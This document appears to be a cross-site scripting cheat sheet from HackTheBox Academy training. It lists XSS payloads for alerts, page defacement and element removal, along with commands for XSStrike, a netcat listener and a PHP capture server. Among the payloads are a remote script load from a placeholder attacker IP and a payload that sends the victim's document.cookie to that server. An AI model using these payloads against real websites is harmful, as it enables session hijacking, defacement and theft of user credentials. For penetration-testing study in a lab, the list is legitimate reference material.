
---

### **XSS Payloads**

| **Code**                                                                                      | **Description**                                                       |
| --------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload: Displays the origin of the website.                |
| `<plaintext>`                                                                                 | Basic XSS Payload: Renders everything after this tag as plain text.   |
| `<script>print()</script>`                                                                    | Basic XSS Payload: Triggers the `print()` function.                   |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload: Executes an alert if the image fails to load. |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change the webpage's background color.                                |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change the webpage's background image.                                |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change the title of the webpage.                                      |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite the website's main body with custom text.                   |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove a specific HTML element by its `id`.                           |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load a remote script from a specified server.                         |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send cookies to your server for exploitation.                         |

---

### **Command Utilities**

|**Command**|**Description**|
|---|---|
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run XSStrike on a specific URL parameter to test for XSS vulnerabilities.|
|`sudo nc -lvnp 80`|Start a Netcat listener on port 80. Useful for receiving requests or data.|
|`sudo php -S 0.0.0.0:80`|Start a PHP server on port 80 to serve files or capture data.|

---
